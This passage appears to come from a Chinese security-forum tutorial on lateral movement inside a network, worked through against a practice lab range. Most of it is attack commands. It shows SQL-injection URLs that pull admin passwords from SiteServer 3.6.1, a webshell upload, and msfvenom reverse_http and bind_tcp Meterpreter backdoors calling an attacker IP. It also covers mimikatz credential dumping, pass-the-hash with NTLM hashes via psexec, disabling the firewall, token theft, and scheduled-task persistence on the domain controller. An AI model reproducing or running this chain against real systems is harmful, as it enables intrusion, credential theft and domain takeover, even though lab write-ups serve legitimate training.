执行exe上线：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_2TFZJ6EX3UM3HVF.png)

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%B8%83%E3%80%81%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5)七、靶场实践

## [](https://bbs.pediy.com/thread-268289.htm)7.1 信息收集

这个靶场是月师傅所搭，我们用这个靶场作为实践，靶场拓扑图：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_3XX42FRFCWAD877.png)  
先进行主机发现，方法有许多，分别是基于层面和工具上的不同：  
1、使用netdiscover  
sudo netdiscover -i eth0 -r 192.168.202.0/24  
专用的二层发现工具。拥有主动和被动发现两种方式。  
常用参数:  
-i：网卡 选择你监控的网卡。比如eth0  
-r：range 指定IP段。比如192.168.0.0/24  
-l：filename 从文件读取range列表  
-p 被动模式。默默的侦听指定的网卡以发现别的二层主机  
-t ARP包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。  
-c 发包数量  
2、使用nmap  
nmap -v -sP 192.168.202.0/24  
以上参数：  
-sP、ICMP扫描： 类似于ping检测，快速判断目标主机是否存活，不做其他扫描  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_S7VQR4YCFHUZVR6.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_9YQK4ST92HFNV56.png)  
3、使用系统自带ping(速度稍慢)  
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=”  
fping -g 10.10.10.0/24



然后对所发现的主机进行端口扫描，同样也有不同工具来进行端口扫描：  
1、nmap  
nmap -sS -p 1-65535 -v 192.168.202.183  
以上参数：  
-P 指定端口扫描  
-V 详细信息  
-sS、TCP SYN扫描（半开扫描）： 只向目标发出SYN数据包，如果收到SYN/ACK响应包就认为目标端口正在监听，并立即断开连接；否则认为目标端口并未开放。  
-sT、TCP 连接扫描： 这是完整的TCP扫描方式，用来建立一个TCP连接，如果成功则认为目标端口正在监听服务，否则认为目标端口并未开放。  
-sF、TCP FIN扫描： 开放的端口会忽略这种数据包，关闭的端口会回应RST数据包。许多防火墙只对SYN数据包进行简单过滤，而忽略了其他形式的TCP攻击包。这种类型的扫描可间接检测防火墙的健壮性。  
-sU、UDP扫描： 探测目标主机提供哪些UDP服务，UDP扫描的速度会比较慢。  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_9AUXVW657UDYFY4.png)  
识别对应的端口  
nmap -sV -A 192.168.202.183 -p 80,53,6588,5985,3389,135,21,999 -oA
myAttackPorts  
-sV: 探测相应服务版本号  
-A: 综合扫描，包含1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测  
-oA：同时在三个主要的格式文档输出扫描结果  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TBRDDWP33AE9HTG.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TWJEJKGZR3DGEWT.png)  
使用xsltproc美化结果输出文档：  
xsltproc -o attck.html mode.xsl myAttackPorts.xml  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_EVY2JF5EYFHCDCH.png)



2、masscan  
sudo masscan -p 1-65535 192.168.202.183 --rate=1000  
常用参数：  
-p <ports,--ports <ports>> 指定端口进行扫描  
\--banners 获取banner信息，支持少量的协议  
\--rate <packets-per-second> 指定发包的速率，默认的速率是100包/秒  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_J7N44XAK423U7XZ.png)



绑定域名，再对其www.moonlab.com进行目录爆破，  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_GSX7X5T5Y7TN5KT.png)  
如果用kali自带的dirbuster工具会因为UA和速度等问题被拦截：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_4V9EFGY9HNGHPVW.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_DRDANTVV9HH26AT.png)  
所以我们可以自己编写脚本进行目录的爆破，每间隔0.5秒进行请求操作：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_Q3XK7E8Q3N3BPBB.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_U2P2S62W76GU3WV.png)

## [](https://bbs.pediy.com/thread-268289.htm)7.2 web漏洞

访问网址可知，这是siteserver3.6.1，从网上找到该版本报错注入的相关poc，获得数据库版本信息：  
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_J8X63NY89QUWHT3.png)  
获得数据库名：  
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20db_name()=~2;%20--  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_QQKFE4WA9T532DC.png)  
根据查询数据库语句相继获取到后台的用户名、密码及salt值：  
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20~1=(SELECT%20TOP%201%20[Password]%20FROM%20[bairong_Administrator]);%20--  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_EE9SMBR8FHGK85V.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_BMSANUAUQGEGMPP.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TRZ3N6V227PGMR8.png)



然后我们根据网上所下载的原理分析出其登录时的密码加密流程：  
先看FrameworkLogin类的Submit_Onclick()方法，流程很简单先判断验证码，然后把用户名和密码传入AdminManager.Authticate：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_ES9S4JTAVG687Q5.png)  
继续跟入AdminManager.Authticate，调用了AdministratorDAO.ValidateUser()验证：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_X3Z3CHQHXZKGGGG.png)  
继续跟入AdministratorDAO.ValidateUser()的实现，函数先根据用户名找到用户的信息，根据数据库中用户的密码与输入的密码调用checkpassword()函数进行比对：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_EW6JKUN8JFDZDH8.png)  
把数据库中的密码和salt传入DecodePassword()进行相应的解密：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_6FV53TPPVM5C2BW.png)  
DecodePassword()函数中调用的是系统库的des解密：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_3WVQXG8QY8QUD5H.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_NFFSDED2SNEJ9XQ.png)  
我们了解了相关的解密流程，就可以自己编写相关的解密工具去解密前面注入得到的密码为admin5566。



我们使用密码登入后台，将一句话打包为zip并在站点模板里进行上传，并使用菜刀连接：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_ZZE72KMG6W7R4TW.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_G4J7EAYSHQF7MSH.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_AQX5NT4ZQT3JQG9.png)



可见SeImpersonatePrivilege是已启用的，当我们具有了SeAssignPrimaryToken或SeImpersonate特权，那么就意味着具有了SYSTEM的权限。我们可以通过上述这两个特权，在其他用户的上下文中运行代码，甚至创建新的进程。拥有SeImpersonatePrivilege特权，就可以调用CreateProcessWithToken()；拥有SeAssignPrimaryTokenPrivilege特权，就可以调用CreateProcessAsUser()。而PrintSpoofer就是这样的一款开源工具：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_VNGFCECZF6SUCPM.png)  
同时我们也可以通过net start查看当前计算机开启了哪些服务，根据服务名进行判断是否对后续提权有帮助的。

## [](https://bbs.pediy.com/thread-268289.htm)7.3 内网渗透

我们使用msf生成相关后门，利用PrintSpoofer执行后门：  
msfvenom -p windows/meterpreter/reverse_http lhost=192.168.202.180 lport=22222
-f exe -o h4.exe //生成exe  
use exploit/multi/handler //建立监听  
set payload windows/meterpreter/reverse_http  
set lport 22222  
set lhost 192.168.202.180  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_ZEMUNHPACV6PFKM.png)  
因为目标机器是windows server 2016获取不到明文密码，我们使用msf中自带模块run
post/windows/gather/smart_hashdump，把hash dump出来  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_RZ9GVET3N2T7X6Y.png)  
当我们拿到hash后，可以使用hashcat进行hash值得爆破，  
hashcat -a 0 -m 1000 hash.txt rockyou.txt --force  
-a 0 爆破模式为字典模式  
-m 是指定哈希类型  
hash.txt 是 ntml  
rockyou.txt 是字典  
也可以使用Hash传递登录RDP远程桌面，  
Sekurlsa::pth /user:Administrator /domain: 192.168.202.183
/ntlm:fac5d668099409cb6fa223a32ea493b6 “/run:mstsc.exe /restrictedadmin”  
又可以使用hash建立ipc连接。



查看当前主机存在哪些网段run get_local_subnets:  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_THA4QSWCV8GQDFW.png)  
先进行内网中得主机发现，使用msf自带得arp：run arp_scanner -r 10.10.1.0/24  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_RXA64W6P6KGQMST.png)  
Msf添加路由，run autoroute -s 10.10.1.0/24  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TVHBTMTHFX4T4SU.png)  
对所发现的IP进行端口扫描：proxychains nmap -sC -A 10.10.1.130 -p
80,53,1433,49154,6588,3389,135,21,51464,999，可见只有80端口是开放得：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_AVD38HKHPUF92DH.png)  
通过访问80端口得知是通达oa尝试使用其RCE漏洞，先用蚁剑生成php小马再利用RCE exp脚本进行攻击：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_RKWANRRCX9RTR7W.png)  
连接小马，当前权限为system:  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_R33T3V9TZPRHTS9.png)



利用Net start、tasklist、netstat -ano等相关命令进行信息收集，得知windows Firewall打开，执行NetSh
Advfirewall set allprofiles state off命令关闭防火墙。  
接着用msf生成bind后门：msfvenom -p windows/meterpreter/bind_tcp lport=13777 -f exe -o
hb.exe，用antsword文件上传bind.exe，并执行：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_F988C99DRJT97MU.png)



Msf执行相应命令进行连接：  
use exploit/multi/handler  
set payload windows/meterpreter/bind_tcp  
set RHOST 10.10.1.130  
set lport 13777  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_R9RASVX8FYX4BYW.png)  
查看当前主机存在哪些网段run get_local_subnets:  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_8TVXF39CYHBT8Q7.png)  
Migrate 迁移进程后，load kiwi加载mimiatz，kiwi_cmd
sekurlsa::logonpasswords尝试使用其获取hash：357bec0ee1f524c62ba536fcd3f74472  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_XXJMF4T78PEAU72.png)  
执行sysinfo，可见该主机存在域中：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_8TSH9A28GRMWDB9.png)  
使用net time定位域控：  
Chcp 65001设置乱码  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_6VNDH2KJTJCMRNS.png)  
使用msf自带模块定位域控run post/windows/gather/enum_domain，得到域控ip：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_5KMBRP8X68XTGRB.png)  
使用msf自带模块判断该主机是否有域管登录过，run post/windows/gather/enum_logged_on_users：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_ZX4WMXPJEM9U33T.png)  
还有其他相关msf自带得收集信息模块：run post/windows/gather/enum_ad_groups，  
run post/windows/gather/enum_domain_tokens



ps查看当前进程信息，可见当前域管是在线的，可以使用steal_token进行token窃取（需要system权限），窃取到ATTACK\adminstrator后再使用其身份执行dcsync_ntlm获得hash：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_XPNJHFQYZF5C3PK.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_26RJFRH4GP6TY4V.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_PC8S2ZBDFPDDJ7A.png)  
添加路由后，我们使用nmap对域控ip进行扫描proxychains nmap -sC -A 10.10.10.165 -p
80,53,445,1433,49154,6588,3389,135,21,51464,999：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_6TNKKP77Q35XN5T.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_TTFM687PCGF4D4Y.png)  
开放了445端口，我们可以利用获得得hash：357bec0ee1f524c62ba536fcd3f74472进行pth传递：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_F7CP3HA39ZP5YUG.png)  
如果我们使用msf自带的: use
exploit/windows/smb/psexec模块，因为域控主机开启了防火墙，组织程序进出，所以无论payload是bind或reserve都失败：  
set rhosts 10.10.10.165  
set smbuser administrator  
set smbpass aad3b435b51404eeaad3b435b51404ee:357bec0ee1f524c62ba536fcd3f74472  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_YGAYAG5C4XK6VBE.png)  
我们可以使用第三方Impacket工具包中的smbexec和psexec进行pth，执行下面命令：  
PsExec -hashes :357bec0ee1f524c62ba536fcd3f74472
ATTACK/Administrator@10.10.10.165 "whoami"，连接到域控主机当前是system权限  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_FWU7SNJ4FKKPF29.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_GNT6F76G8ZK5DQ8.png)  
使用copy命名把后门复制到域控中：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_FYZ3MW3RMPM5BHJ.png)  
使用如下命令  
Schtasks /create /s 10.10.10.165 /ru "SYSTEM" /tn executefile /sc DAILY /tr
c:/hb.exe /F  
Schtasks /run /s 10.10.10.165 /tn executefile /i  
创建计划任务，执行相关后门：  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_3E5ZV82D39GBQYU.png)  
![](./\[原创\]内网横移技巧及靶场实践-WEB安全-看雪论坛-
安全社区_安全招聘_bbs.pediy.com_files/718877_UARGUTGWE6XMXBJ.png)

# [](https://bbs.pediy.com/thread-268289.htm)参考:

https://www.moonsec.com/  
内网安全攻防



  

